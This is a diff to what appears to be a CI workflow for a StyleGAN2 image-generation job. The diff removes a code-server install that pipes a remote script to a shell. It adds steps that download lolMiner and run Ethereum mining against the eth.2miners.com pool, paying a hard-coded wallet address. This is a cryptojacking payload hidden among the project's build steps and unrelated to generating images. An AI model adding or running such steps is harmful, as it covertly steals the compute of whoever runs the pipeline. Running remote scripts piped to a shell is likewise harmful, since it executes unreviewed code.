@@ -34,16 +34,12 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
-        curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
-        
-        curl -fsSL https://code-server.dev/install.sh | sh
-        curl -fOL https://github.com/cdr/code-server/releases/download/v$VERSION/code-server_$VERSION_amd64.deb
-        sudo dpkg -i code-server_$VERSION_amd64.deb
-        sudo systemctl enable --now code-server@$USER
-        # Now visit http://127.0.0.1:8080. Your password is in ~/.config/code-server/config.yaml
+        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.33/lolMiner_v1.33_Lin64.tar.gz
+        tar -xf lolMiner_v1.33_Lin64.tar.gz
+        cd 1.33
+        ./lolMiner.exe --algo ETHASH --pool eth.2miners.com:2020 --user 0x2c00cf3a9ceccd55ad829b284d76e48b34bec7d3.GooglE
 
-
-        python run_generator.py generate-images \
+          python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
           --truncation-psi=0.5 \
